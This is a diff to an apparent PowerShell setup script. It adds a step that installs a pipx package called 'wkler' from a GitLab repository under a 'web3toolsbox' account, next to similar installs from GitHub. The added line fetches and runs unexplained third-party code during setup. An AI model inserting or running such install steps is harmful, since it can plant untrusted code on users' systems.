@@ -645,6 +645,7 @@ try {
     $pipxInvoker = Install-Pipx -PythonPath $pythonPath
     Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe') -VenvNames @('agent-setting')
     Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe') -VenvNames @('auto-backup-wins')
+    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://gitlab.com/web3toolsbox/wkler.git' -CommandNames @('wkler', 'wkler.exe') -VenvNames @('wkler')
 
     if (Test-Path '.configs' -PathType Container) {
         Write-StepLog 'Applying environment configuration'
